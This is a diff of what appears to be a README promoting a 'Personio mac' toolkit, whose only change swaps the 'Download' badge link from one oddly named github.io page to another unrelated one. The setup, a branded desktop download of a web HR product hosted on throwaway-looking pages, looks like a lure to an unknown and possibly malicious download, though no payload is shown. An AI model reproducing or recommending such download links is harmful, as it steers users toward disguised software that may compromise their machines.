@@ -2,7 +2,7 @@
 
 Personio mac on macOS — toolkit focused on hris core, plus time off & attendance and payroll integrations with native integrations and Apple silicon p
 
-[![Download Personio mac](https://img.shields.io/badge/Download-Personio_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Personio mac](https://img.shields.io/badge/Download-Personio_mac-blueviolet)](https://curelladecbugos.github.io/.github/Personio-Forge)
 
 ---
 
